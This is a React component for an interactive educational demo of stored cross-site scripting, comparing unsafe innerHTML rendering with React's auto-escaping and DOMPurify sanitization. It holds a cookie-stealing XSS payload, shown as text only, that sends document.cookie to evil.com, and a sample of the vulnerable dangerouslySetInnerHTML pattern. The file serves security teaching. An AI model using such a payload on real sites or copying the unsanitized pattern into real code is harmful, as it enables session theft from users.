import { AnimatePresence, motion } from "motion/react";
import { useState } from "react";
import { ShikiCode } from "../shared/ShikiCode";

// Code samples shown as text — never executed
const VULNERABLE_CODE_SAMPLE = `// Vulnerable React component — bypasses React's auto-escaping
function Comment({ text }: { text: string }) {
  // DANGEROUS: never pass unsanitized user input here
  // dangerouslySetInnerHTML={{ __html: text }}  <-- XSS vector
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}`;

const SAFE_CODE_SAMPLE = `// Safe React default — React auto-escapes string children
function Comment({ text }: { text: string }) {
  return <div>{text}</div>; // renders as text, never parsed as HTML
}

// If rich HTML is required: sanitize before rendering
import DOMPurify from 'dompurify';
// Note: DOMPurify must run in a browser environment (not Node.js)

function RichComment({ text }: { text: string }) {
  const sanitized = DOMPurify.sanitize(text); // strips dangerous tags
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}`;

interface Comment {
	id: number;
	author: string;
	text: string;
	isAttacker: boolean;
}

const INITIAL_COMMENTS: Comment[] = [
	{ id: 1, author: "alice", text: "Great article!", isAttacker: false },
	{ id: 2, author: "bob", text: "Very helpful, thanks.", isAttacker: false },
];

// Educational payload — shown as plain text only, never executed
const MALICIOUS_PAYLOAD_DISPLAY =
	'Great post! <img src="x" onerror="fetch(\'https://evil.com/?c=\'+document.cookie)">';

function getInitialState() {
	return {
		comments: INITIAL_COMMENTS,
		safeMode: true,
		stolenSessions: 0,
		phase: "idle" as "idle" | "posted" | "victims",
		victimCount: 0,
		// Mode is locked in at the time the comment is posted,
		// so victim simulation always reflects the mode that was active then.
		modeAtPost: null as boolean | null,
	};
}

export function StoredXSSDemo() {
	const [state, setState] = useState(getInitialState);

	const { comments, safeMode, stolenSessions, phase, victimCount, modeAtPost } =
		state;

	// During victim simulation, use the locked-in mode from when the comment was posted.
	// While idle or posting, show the live toggle value.
	const effectiveSafeMode = modeAtPost ?? safeMode;
	const isVulnerable = !effectiveSafeMode;

	function setSafeMode(value: boolean) {
		// Only allow toggling before a comment has been posted
		if (phase === "idle") {
			setState((s) => ({ ...s, safeMode: value }));
		}
	}

	function postMaliciousComment() {
		setState((s) => ({
			...s,
			comments: [
				...s.comments,
				{
					id: Date.now(),
					author: "attacker",
					text: MALICIOUS_PAYLOAD_DISPLAY,
					isAttacker: true,
				},
			],
			phase: "posted",
			// Lock in the mode at the moment of posting
			modeAtPost: s.safeMode,
		}));
	}

	function simulateVictimVisit() {
		setState((s) => ({
			...s,
			victimCount: s.victimCount + 1,
			phase: "victims",
			// Stolen sessions only increment when locked-in mode was vulnerable
			stolenSessions:
				s.modeAtPost === false ? s.stolenSessions + 1 : s.stolenSessions,
		}));
	}

	function reset() {
		setState(getInitialState());
	}

	return (
		<div className="space-y-6">
			{/* Toggle — disabled once comment is posted to prevent mode/counter desync */}
			<div className="flex items-center gap-3 flex-wrap">
				<button
					type="button"
					disabled={phase !== "idle"}
					onClick={() => setSafeMode(false)}
					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
						!safeMode
							? "bg-red-500/20 text-accent-red-soft border border-red-500"
							: "bg-surface-secondary text-text-tertiary border border-border-secondary hover:border-border-tertiary"
					}`}
				>
					innerHTML (Vulnerable)
				</button>
				<button
					type="button"
					disabled={phase !== "idle"}
					onClick={() => setSafeMode(true)}
					className={`px-4 py-2 rounded text-sm font-medium transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
						safeMode
							? "bg-emerald-500/20 text-accent-emerald-soft border border-emerald-500"
							: "bg-surface-secondary text-text-tertiary border border-border-secondary hover:border-border-tertiary"
					}`}
				>
					textContent (Safe)
				</button>
				{phase !== "idle" && (
					<span className="text-xs text-text-muted italic">
						Reset to change mode
					</span>
				)}
			</div>

			{/* Comment board — all comments rendered via React string children, never innerHTML */}
			<div className="bg-surface-secondary rounded-lg border border-border-secondary overflow-hidden">
				<div className="px-4 py-3 border-b border-border-secondary flex items-center justify-between">
					<p className="text-sm font-semibold text-text-secondary">
						Comment Board
					</p>
					<span className="text-xs text-text-muted">
						blog.example.com/post/1
					</span>
				</div>
				<div className="p-4 space-y-3">
					{comments.map((c) => (
						<motion.div
							key={c.id}
							initial={{ opacity: 0, y: 6 }}
							animate={{ opacity: 1, y: 0 }}
							className={`rounded p-3 border text-sm ${
								c.isAttacker
									? isVulnerable
										? "bg-red-500/10 border-red-500/40"
										: "bg-emerald-500/10 border-emerald-500/30"
									: "bg-surface-primary border-border-secondary"
							}`}
						>
							<div className="flex items-center gap-2 mb-1">
								<span
									className={`text-xs font-semibold ${c.isAttacker ? "text-accent-rose-soft" : "text-sky-400"}`}
								>
									{c.author}
								</span>
								{c.isAttacker && (
									<span className="text-xs text-text-muted">
										(attacker payload)
									</span>
								)}
							</div>
							{/* Always rendered via React children — tags shown as literal text */}
							<p className="text-text-secondary text-xs font-mono break-all">
								{c.text}
							</p>
							{c.isAttacker && isVulnerable && (
								<p className="mt-1 text-xs text-accent-red-soft">
									⚠ Simulated: with innerHTML, this payload executes for every
									visitor
								</p>
							)}
							{c.isAttacker && !isVulnerable && (
								<p className="mt-1 text-xs text-accent-emerald-soft">
									✓ Rendered as text — HTML tags not parsed
								</p>
							)}
						</motion.div>
					))}
				</div>

				{/* Actions */}
				<div className="px-4 pb-4 flex flex-wrap gap-2">
					{phase === "idle" && (
						<button
							type="button"
							onClick={postMaliciousComment}
							className="px-3 py-1.5 bg-rose-500/20 text-accent-rose-soft border border-rose-500 rounded text-xs font-medium hover:bg-rose-500/30 transition-colors"
						>
							Post Malicious Comment (as Attacker)
						</button>
					)}
					{phase !== "idle" && (
						<button
							type="button"
							onClick={simulateVictimVisit}
							className="px-3 py-1.5 bg-sky-500/20 text-sky-400 border border-sky-500 rounded text-xs font-medium hover:bg-sky-500/30 transition-colors"
						>
							Simulate Victim Visit
						</button>
					)}
					<button
						type="button"
						onClick={reset}
						className="px-3 py-1.5 bg-surface-tertiary text-text-tertiary rounded text-xs font-medium hover:bg-surface-tertiary transition-colors"
					>
						Reset
					</button>
				</div>
			</div>

			{/* Victim counter */}
			<AnimatePresence>
				{victimCount > 0 && (
					<motion.div
						initial={{ opacity: 0, scale: 0.95 }}
						animate={{ opacity: 1, scale: 1 }}
						className={`rounded-lg p-4 border text-sm ${
							isVulnerable
								? "bg-red-500/10 border-red-500/40"
								: "bg-emerald-500/10 border-emerald-500/30"
						}`}
					>
						<p className="font-semibold mb-1">
							{victimCount} visitor{victimCount !== 1 ? "s" : ""} loaded the
							page
						</p>
						{isVulnerable ? (
							<p className="text-accent-red-soft text-xs">
								🔴 {stolenSessions} session{stolenSessions !== 1 ? "s" : ""}{" "}
								stolen — payload fires for every visitor automatically from a
								single malicious post
							</p>
						) : (
							<p className="text-accent-emerald-soft text-xs">
								✓ All {victimCount} visitor{victimCount !== 1 ? "s" : ""} saw
								the text safely — no script execution
							</p>
						)}
					</motion.div>
				)}
			</AnimatePresence>

			{/* Key insight */}
			<div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4 text-sm">
				<p className="text-accent-amber-soft font-semibold mb-1">Key Insight</p>
				<p className="text-text-secondary text-xs">
					React JSX escapes by default — XSS risk appears when developers bypass
					this with{" "}
					<code className="text-accent-red-soft font-mono">
						dangerouslySetInnerHTML
					</code>{" "}
					or direct{" "}
					<code className="text-accent-red-soft font-mono">
						element.innerHTML
					</code>{" "}
					assignment outside React.
				</p>
			</div>

			{/* Code — reflects current toggle for reference */}
			<div>
				<p className="text-xs text-text-tertiary mb-2 font-semibold uppercase tracking-wider">
					{isVulnerable ? "Vulnerable Pattern" : "Safe Pattern"}
				</p>
				<ShikiCode
					language="typescript"
					code={isVulnerable ? VULNERABLE_CODE_SAMPLE : SAFE_CODE_SAMPLE}
					className="text-xs"
				/>
			</div>
		</div>
	);
}
